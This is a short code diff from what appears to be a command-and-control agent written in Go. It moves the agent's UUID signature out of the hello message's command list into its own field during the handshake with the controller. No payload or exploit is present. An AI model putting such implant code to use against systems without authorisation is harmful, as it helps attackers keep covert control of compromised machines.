@@ -187,10 +187,11 @@ func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def
 			cnt-- // consume cnt
 
 			// send hello
-			hello_msg.CmdSlice = []string{config.AgentUUID, config.AgentUUIDSig, util.RandStr(util.RandInt(1, 100))}
+			hello_msg.CmdSlice = []string{util.RandStr(util.RandInt(1, 100))}
 			hello_msg.CmdID = uuid.NewString()
 			hello_msg.Tag = config.AgentTag
 			hello_msg.AgentUUID = config.AgentUUID
+			hello_msg.AgentUUIDSig = config.AgentUUIDSig
 			if encodeErr := out.Encode(hello_msg); encodeErr != nil {
 				logging.Errorf("agent cannot connect to cc: %v", encodeErr)
 				util.TakeABlink()
